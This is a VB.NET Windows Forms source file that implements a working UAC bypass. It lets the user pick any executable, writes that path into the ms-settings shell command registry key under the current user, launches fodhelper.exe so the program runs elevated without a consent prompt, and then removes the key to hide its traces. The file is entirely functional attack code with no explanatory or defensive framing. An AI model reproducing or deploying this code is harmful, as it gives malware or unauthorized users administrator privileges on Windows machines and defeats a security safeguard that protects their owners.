Imports System.Security.Principal
Imports Microsoft.Win32
Imports System.IO

Public Class Main
    Private Sub SelectButton_Click(sender As Object, e As EventArgs) Handles SelectButton.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .Filter = "exe|*.exe"
            .ShowDialog()
        End With
        If OFD.FileName.Length > 3 Then
            PathBox.Text = OFD.FileName
        End If
    End Sub

    Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        Dim fodPath As String = "C:\Windows\System32\fodhelper.exe"
        If System.IO.File.Exists(fodPath) Then
            If PathBox.Text.Length > 3 Then
                Dim windowsPrincipal As WindowsPrincipal = New WindowsPrincipal(WindowsIdentity.GetCurrent())
                If windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator) = False Then
                    Try
                        Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Classes\ms-settings\shell\open\command")
                        registryKey.SetValue("", PathBox.Text, RegistryValueKind.String)
                        registryKey.SetValue("DelegateExecute", "", RegistryValueKind.String)
                        Process.Start(fodPath).WaitForExit()
                        registryKey.Close()
                        registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Classes")
                        registryKey.DeleteSubKeyTree("ms-settings")
                        registryKey.Close()
                    Catch ex As Exception
                        MsgBox(ex)
                    End Try
                Else
                    Process.Start(PathBox.Text)
                End If
            End If
        Else
            MsgBox("FodHelper is not exist")
        End If
    End Sub
End Class
